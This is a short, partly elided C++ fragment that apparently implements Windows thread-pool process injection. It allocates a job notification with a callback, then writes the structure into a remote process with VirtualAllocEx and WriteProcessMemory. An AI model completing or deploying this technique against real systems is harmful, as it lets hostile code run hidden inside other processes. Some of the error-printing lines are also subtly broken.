...
int main() {
	...
	const auto Ntstatus = TpAllocJobNotification(&pTpJob, hJob, OEP, nullptr, nullptr);
	cout << pTpJob;
	if (!NT_SUCCESS(Ntstatus))
	{
		cout << ("TpAllocJobNotification %d", RtlNtStatusToDosError(Ntstatus));
		return -1;
	}

	const auto RemoteTpJobAddress = VirtualAllocEx(hProc, nullptr, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (RemoteTpJobAddress == NULL)
	{
		cout << ("VirtualAllocEx %d", GetLastError());
		return -1;
	}

	if (!WriteProcessMemory(hProc, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB), nullptr)) {
		cout << ("WriteProcessMemory %d", GetLastError());
		return -1;
	}
	...
	//cout << JobAssociateCopmletionPort.CompletionPort;
